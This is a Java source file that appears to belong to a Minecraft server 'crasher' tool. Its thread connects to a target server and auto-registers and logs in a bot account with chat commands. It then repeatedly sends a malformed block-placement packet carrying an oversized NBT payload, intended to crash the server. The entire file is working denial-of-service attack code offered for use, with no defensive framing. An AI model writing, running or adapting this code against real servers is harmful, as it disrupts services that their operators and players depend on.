package net.moofMonkey.crasher;


import static net.moofMonkey.Network.sendChat;
import static net.moofMonkey.Network.sendClientSettings;
import static net.moofMonkey.Network.sendHandshake;
import static net.moofMonkey.Network.sendReady;

import java.io.DataOutputStream;
import java.io.IOException;
import java.net.Socket;

public class CrasherThread extends Thread {
	private final String ip;
	private final String name;
	private final int version;

	public CrasherThread(final String ip, final String name, final int version) {
		this.ip = ip;
		this.name = name;
		this.version = version;
	}

	@Override
	public void run() {
		try {
			final String[] split = this.ip.split("[:]");
			final String host = split[0];
			final int port = (split.length > 1)
					? Integer.parseInt(split[1])
					: 25565;
			@SuppressWarnings( "resource" )
			final Socket socket = new Socket(host, port);
			socket.setSoTimeout(30000);
			socket.setTrafficClass(24);
			if (!socket.isConnected()) {
				System.out.println("#### CONNECTION FAILED ####");
			} else {
				final DataOutputStream dos = new DataOutputStream(socket
						.getOutputStream());
				sendHandshake(version, name, dos, host, port);
				Thread.sleep(500L);
				sendReady(dos);
				Thread.sleep(1000L);
				sendClientSettings(dos);
				Thread.sleep(100L);
				sendChat(dos, "/reg 1234 1234");
				sendReady(dos);
				Thread.sleep(1000L);
				sendChat(dos, "/l 1234");
				sendReady(dos);
				Thread.sleep(100L);
				sendReady(dos);
				while (true) {
					sendReady(dos);
					sendReady(dos);
					Thread.sleep(1000L);
					sendCrash(dos);
				}
			}
		} catch(Throwable t) {
			t.printStackTrace();
			System.out.println("#### CONNECTION FAILED ####");
		}
	}

	public static void sendCrash(DataOutputStream dos) throws IOException { // FIXME: Packet place block
		dos.writeInt(1);
		dos.writeByte(1);
		dos.writeInt(1);
		dos.writeByte(1);
		dos.writeShort(1);
		dos.writeByte(1);
		dos.writeShort(1);
		dos.writeShort(TooLongNBT.getDataLength());
		dos.write(TooLongNBT.getData());
		dos.writeByte(0);
		dos.writeByte(0);
		dos.writeByte(0);
	}
}
